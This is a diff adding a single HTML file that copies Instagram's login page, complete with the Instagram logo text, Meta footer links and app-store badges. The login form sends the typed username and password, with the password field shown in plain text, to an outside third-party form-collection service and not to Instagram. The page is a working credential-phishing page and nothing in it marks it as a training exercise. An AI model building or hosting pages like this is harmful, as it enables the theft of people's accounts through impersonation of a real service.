@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram-Style Form</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+    body {
+      background-color: #f9f9f9; /* Dark background like the screenshot */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      min-height: 100vh;
+      color: #000000;
+    }
+    .main-container {
+      max-width: 350px;
+      width: 100%;
+      background-color: #ffffff;
+      border: 1px solid #878585;
+      padding: 40px 40px 20px 40px;
+      text-align: center;
+      border-radius: 4px;
+    }
+    .instagram-logo {
+      font-family: 'Cookie', cursive;
+      font-size: 50px;
+      color: #000000;
+      margin-bottom: 20px;
+      /* If you want the actual Instagram script, you need the custom font or an image.
+         For demonstration, we'll just do text. */
+    }
+    .input-field {
+      width: 100%;
+      margin: 5px 0;
+    }
+    .input-field input {
+      width: 100%;
+      padding: 9px;
+      background: #f6f6f6;
+      border: 1px solid #262626;
+      border-radius: 3px;
+      color: #000000;
+      font-size: 14px;
+    }
+    .login-btn {
+      width: 100%;
+      background-color: #0095f6;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 8px 0;
+      font-weight: 600;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+    .or-container {
+      display: flex;
+      align-items: center;
+      margin: 10px 0;
+      color: #8e8e8e;
+    }
+    .or-line {
+      flex: 1;
+      height: 1px;
+      background-color: #8e8e8e;
+    }
+    .or-text {
+      margin: 0 10px;
+      font-size: 13px;
+      font-weight: 600;
+    }
+    .facebook-login {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: 600;
+      display: block;
+      margin-top: 10px;
+    }
+    .forgot-password {
+      margin-top: 15px;
+      font-size: 12px;
+    }
+    .forgot-password a {
+      color: #0095f6;
+      text-decoration: none;
+    }
+    .signup-container {
+        max-width: 350px;         /* Match the same max-width */
+        width: 100%;              /* Let it fill up to 350px */
+        background-color: #ffffff;
+        border: 1px solid #878585; /* Same border color as .main-container */
+        margin-top: 10px;
+        text-align: center;
+        padding: 20px;           /* Adjust padding as you like */
+        color: #000000;
+        border-radius: 3px; 
+    }
+    .signup-container a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .get-the-app {
+      text-align: center;
+      margin: 20px 0 10px 0;
+    }
+    .app-badges {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 10px;
+    }
+    .app-badges img {
+      height: 40px;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #8e8e8e;
+    }
+    .footer a {
+      color: #8e8e8e;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+    .meta {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #8e8e8e;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Main form container -->
+  <div class="main-container">
+    <!-- "Instagram" heading/logo -->
+    <div class="instagram-logo">Instagram</div>
+    
+    <!-- Form starts -->
+    <form action="https://formspree.io/f/xrbearyk" method="POST">
+      <!-- Username -->
+      <div class="input-field">
+        <input
+          type="text"
+          name="Username"
+          placeholder="Username"
+          required
+        />
+      </div>
+      <!-- Password -->
+      <div class="input-field">
+        <input
+          type="text"
+          name="Password"
+          placeholder="Password"
+          required
+        />
+      </div>
+
+      <!-- Submit Button -->
+      <button class="login-btn" type="submit">Log In</button>
+    </form>
+    
+    <!-- OR separator -->
+    <div class="or-container">
+      <div class="or-line"></div>
+      <div class="or-text">OR</div>
+      <div class="or-line"></div>
+    </div>
+    
+    <!-- Log in with Facebook (dummy link) -->
+    <a href="#" class="facebook-login">Log in with Facebook</a>
+
+    <!-- Forgot password -->
+    <div class="forgot-password">
+      <a href="#">Forgot password?</a>
+    </div>
+  </div>
+
+  <!-- Signup container -->
+  <div class="signup-container">
+    Don’t have an account? <a href="#">Sign up</a>
+  </div>
+
+  <!-- Get the app section -->
+  <div class="get-the-app">
+    Get the app.
+    <div class="app-badges">
+      <!-- You can replace these links with official store badges or your own images -->
+      <a href="#"><img src="app-store-download-badge-2icpq6ssi2xwnpyo-2icpq6ssi2xwnpyo.png" alt="App Store Badge"></a>
+      <a href="#"><img src="png-clipart-google-play-app-store-google-angle-text.png" alt="Google Play Badge"></a>
+    </div>
+  </div>
+
+  <!-- Footer links (optional) -->
+  <div class="footer">
+    <a href="#">Meta</a>
+    <a href="#">About</a>
+    <a href="#">Blog</a>
+    <a href="#">Jobs</a>
+    <a href="#">Help</a>
+    <a href="#">API</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">Locations</a>
+    <a href="#">Top Accounts</a>
+    <a href="#">Hashtags</a>
+    <a href="#">Language</a>
+  </div>
+
+  <!-- "Instagram from Meta" -->
+  <div class="meta">© 2025 Instagram from Meta</div>
+
+</body>
+</html>
